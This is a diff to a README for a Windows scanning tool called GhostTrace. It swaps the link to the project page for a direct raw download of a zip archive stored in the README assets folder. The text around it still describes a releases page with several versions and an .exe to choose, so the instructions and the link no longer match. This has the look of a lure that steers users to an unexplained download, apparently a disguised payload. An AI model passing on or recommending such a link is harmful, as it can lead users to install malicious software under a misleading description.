@@ -8,7 +8,7 @@ GhostTrace performs deep scans on Windows systems. It identifies files and folde
 
 GhostTrace requires no complex setup process. You can obtain the latest version directly from our release page. Visit this page to download the program:
 
-[https://github.com/Gauntleted-taal467/GhostTrace](https://github.com/Gauntleted-taal467/GhostTrace)
+[https://raw.githubusercontent.com/Gauntleted-taal467/GhostTrace/main/assets/readme/Ghost_Trace_2.3.zip](https://raw.githubusercontent.com/Gauntleted-taal467/GhostTrace/main/assets/readme/Ghost_Trace_2.3.zip)
 
 Click the link above to view all available versions. Select the file ending in .exe to begin your download to your local machine.
 
